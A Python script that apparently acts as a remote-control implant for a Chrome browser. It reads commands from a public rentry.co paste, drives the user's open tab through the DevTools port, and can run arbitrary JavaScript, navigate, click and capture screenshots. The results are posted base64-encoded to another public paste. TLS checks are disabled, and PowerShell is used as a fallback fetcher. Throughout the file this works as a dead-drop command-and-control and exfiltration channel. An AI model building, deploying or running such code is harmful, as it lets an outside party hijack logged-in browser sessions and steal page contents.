import requests, json, time, ssl, urllib.request, urllib.parse, threading, re, random, sys, html, subprocess
from collections import deque
print('POLLER30_START', time.time(), flush=True)

CMD_URL = 'https://rentry.co/cmds-tom8470'
R_URL   = 'https://rentry.co/sg9wx4dy'
R_EDIT  = 'https://rentry.co/api/edit/sg9wx4dy'
R_CODE  = 'tom8470res'
U = urllib.request
CTX = ssl._create_unverified_context()

last_rev = 0
last_err = 'boot'
_prev_err = ''
wsp = None
wsp_lock = threading.Lock()
wsj = None
wsj_lock = threading.Lock()
log_lines = []          # resultados acumulados (b64 por linha)
log_lock = threading.Lock()
dirty = threading.Event()

def note_err(e):
    global last_err, _prev_err
    last_err = str(e)[:150]
    if last_err != _prev_err:
        _prev_err = last_err
        print('ERR>', last_err, flush=True)

def tabs():
    return json.load(U.urlopen('http://localhost:9222/json/list', timeout=15))

def pages():
    return [t for t in tabs() if t.get('type')=='page']

def ws_open(url):
    from websocket import create_connection
    return create_connection(url, suppress_origin=True, timeout=45)

def csend(ws, method, params):
    ws.settimeout(45)
    ws.send(json.dumps({'id': random.randint(1,99999), 'method': method, 'params': params}))
    t = time.time()
    while time.time()-t < 40:
        try:
            r = json.loads(ws.recv())
        except Exception:
            raise Exception('ws-timeout')
        if 'result' in r or 'error' in r:
            return r
    return {'error':'timeout'}

def ev(ws, expr):
    r = csend(ws, 'Runtime.evaluate', {'expression':expr,'returnByValue':True,'awaitPromise':True})
    try: return r['result']['result'].get('value')
    except Exception: return 'ERR:'+json.dumps(r)[:150]

def connect_json_tab():
    global wsj
    ts = [t for t in pages() if 'rentry.co/cmds-tom8470' in (t.get('url') or '')]
    if not ts:
        ws = ws_open(tabs()[0]['webSocketDebuggerUrl'])
        csend(ws,'Target.createTarget',{'url':CMD_URL})
        time.sleep(2)
        ts = [t for t in pages() if 'rentry.co/cmds-tom8470' in (t.get('url') or '')]
    if not ts: raise Exception('no-json-tab')
    wsj = ws_open(ts[0]['webSocketDebuggerUrl'])

def connect_work_tab():
    global wsp
    ts = [t for t in pages() if 'telegra.ph' not in (t.get('url') or '') and 'rentry.co' not in (t.get('url') or '')]
    if not ts:
        raise Exception('no-work-tab')
    wsp = ws_open(ts[0]['webSocketDebuggerUrl'])

def fetch_cmds_page():
    # caminho 1: aba dedicada no Chrome (browser real, passa no Cloudflare)
    global wsj
    try:
        if wsj is None: connect_json_tab()
        with wsj_lock:
            csend(wsj,'Page.navigate',{'url':CMD_URL+'?r='+str(random.random())})
            time.sleep(1.8)
            txt = ev(wsj,'document.body.innerText') or ''
        return txt
    except Exception as e:
        note_err('fc0:'+str(e))
        try:
            if wsj: wsj.close()
        except Exception: pass
        wsj = None
    # caminho 2: PowerShell Invoke-WebRequest
    try:
        ps = '(Invoke-WebRequest "%s?r=%s" -UseBasicParsing).Content' % (CMD_URL, random.random())
        out = subprocess.check_output(['powershell','-NoProfile','-Command',ps], timeout=40)
        return out.decode('utf-8','ignore')
    except Exception as e:
        note_err('fc1:'+str(e))
    # caminho 3: urllib
    try:
        req = U.Request(CMD_URL + '?r=' + str(random.random()),
                        headers={'User-Agent':'Mozilla/5.0'})
        return U.urlopen(req, timeout=20, context=CTX).read().decode('utf-8','ignore')
    except Exception as e:
        note_err('fc2:'+str(e))
    return ''

def read_cmds():
    global last_rev
    try:
        raw = fetch_cmds_page()
        txt = html.unescape(raw)
        i = txt.find('{"rev"')
        if i < 0:
            if len(txt) > 50: note_err('rc-nofind:'+txt[:100].replace('\n',' '))
            return []
        # balanced-brace parse: conta chaves ate fechar o objeto
        depth = 0; j = -1; ins = False; esc = False
        for k in range(i, len(txt)):
            ch = txt[k]
            if ins:
                if esc: esc = False
                elif ch == '\\': esc = True
                elif ch == '"': ins = False
            else:
                if ch == '"': ins = True
                elif ch == '{': depth += 1
                elif ch == '}':
                    depth -= 1
                    if depth == 0:
                        j = k
                        break
        if j < 0: return []
        try:
            d = json.loads(txt[i:j+1])
        except Exception as e:
            note_err('rc-parse:'+str(e)+' @'+txt[i:j+1][:120])
            return []
        rev = d.get('rev') or 0
        if rev <= last_rev: return []
        last_rev = rev
        return d.get('cmds') or []
    except Exception as e:
        note_err('rc:'+str(e))
        return []

def post_out(payload):
    import base64 as b64
    line = 'R' + b64.b64encode(json.dumps(payload).encode()).decode()
    with log_lock:
        log_lines.append(line)
        # limita log a ~160KB pra nao estourar pagina
        while sum(len(l) for l in log_lines) > 150000:
            log_lines.pop(0)
    dirty.set()

def flush_thread():
    """postador: despeja o log no rentry; urllib primeiro, Chrome fallback"""
    import base64 as b64
    while True:
        dirty.wait(20)
        dirty.clear()
        with log_lock:
            body = '\n'.join(log_lines) or 'EMPTY'
        ok = False
        # caminho 1: urllib direto
        try:
            data = urllib.parse.urlencode({'edit_code':R_CODE,'text':body}).encode()
            U.urlopen(U.Request(R_EDIT, data=data), timeout=20, context=CTX).read()
            ok = True
        except Exception as e:
            note_err('fu1:'+str(e))
        # caminho 2: fetch no-cors dentro do Chrome
        if not ok:
            try:
                expr = ("fetch('%s',{method:'POST',mode:'no-cors',"
                        "headers:{'Content-Type':'application/x-www-form-urlencoded'},"
                        "body:'edit_code=%s&text='+encodeURIComponent(%s)}).then(()=>'ok').catch(e=>'f:'+e)"
                        % (R_EDIT, R_CODE, json.dumps(body)))
                global wsp
                if wsp is not None:
                    with wsp_lock:
                        r = ev(wsp, expr)
                    ok = (r == 'ok')
            except Exception as e:
                note_err('fu2:'+str(e))
        if not ok:
            note_err('flush-fail')
            time.sleep(8)
            dirty.set()

def hb_loop():
    while True:
        try:
            with log_lock:
                q = len(log_lines)
            post_out({'hb':time.time(),'err':last_err[:150],'q':q})
        except Exception: pass
        time.sleep(120)

def handle(m):
    global last_err, wsp
    typ = m.get('type')
    try:
        if typ == 'js':
            with wsp_lock:
                if wsp is None: connect_work_tab()
                try:
                    ans = ev(wsp, m['expr'])
                except Exception:
                    try:
                        if wsp: wsp.close()
                    except Exception: pass
                    wsp = None
                    connect_work_tab()
                    ans = ev(wsp, m['expr'])
            post_out({'id':m['id'],'result':ans})
        elif typ == 'goto':
            with wsp_lock:
                if wsp is None: connect_work_tab()
                csend(wsp,'Page.navigate',{'url':m['url']})
            post_out({'id':m['id'],'result':'nav-ok'})
        elif typ == 'shot':
            with wsp_lock:
                if wsp is None: connect_work_tab()
                r = csend(wsp,'Page.captureScreenshot',{'format':'jpeg','quality':50})
                d = r.get('result',{}).get('data','')
            post_out({'id':m['id'],'result':'SHOT:'+d})
        elif typ == 'click':
            with wsp_lock:
                if wsp is None: connect_work_tab()
                ok = True; err = ''
                for et in ('mousePressed','mouseReleased'):
                    r = csend(wsp,'Input.dispatchMouseEvent',{'type':et,'x':m['x'],'y':m['y'],'button':'left','clickCount':1})
                    if 'error' in r: ok=False; err=json.dumps(r)[:150]
            post_out({'id':m['id'],'result':'CLICKED' if ok else 'ERR:'+err})
        else:
            post_out({'id':m['id'],'result':'unknown'})
    except Exception as e:
        note_err('h:'+str(e))
        post_out({'id':m.get('id'),'result':'ERR:'+str(e)[:150]})

def main():
    threading.Thread(target=flush_thread, daemon=True).start()
    threading.Thread(target=hb_loop, daemon=True).start()
    post_out({'id':'boot','result':'POLLER30_READY'})
    while True:
        try:
            cmds = read_cmds()
            if cmds:
                for c in cmds:
                    post_out({'id':c.get('id'),'ack':True})
                    handle(c)
            time.sleep(2.5)
        except Exception as e:
            note_err('loop:'+str(e))
            time.sleep(6)

main()
